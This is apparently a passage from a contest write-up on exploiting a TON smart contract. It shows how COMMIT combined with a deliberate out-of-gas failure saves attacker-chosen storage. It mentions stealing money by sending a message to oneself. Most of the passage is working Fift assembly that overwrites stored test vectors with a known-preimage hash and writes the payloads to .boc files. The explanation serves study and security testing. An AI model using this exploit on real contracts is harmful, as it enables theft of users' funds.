`out of gas` exception can not be caught by `CATCH`. At the same time `COMMIT` does the following:
> Commits the current state of registers c4 ("persistent data") and c5 ("actions") so that the current execution is considered "successful" with the saved values even if an exception is thrown later.

Combining: we can set registers to the desired state, then *commit*, and then run out of gas.
Straightforward way to steal money is to send a message to ourselves. Alternatively, it is possible to rewrite test vectors to one with a known preimage as below:



```fift
"Asm.fif" include
<{
    //  _0
    DROP	// 
    x{} PUSHSLICE	//  _1
    SHA256U	//  _2
    NEWC	//  _2 _3
    256 STU	//  _5
    ENDC	//  _6
    c4 POP
    COMMIT
    0 PUSHINT	//  _9=0
    SETGASLIMIT
    x{} PUSHSLICE	//  _11
}>c

<b swap ref, b>
2 boc+>B "dehasher.boc" B>file


<{
    DROP	// 
    x{} PUSHSLICE	//  _1
}>c

<b swap ref, b>
2 boc+>B "dehasher2.boc" B>file
```
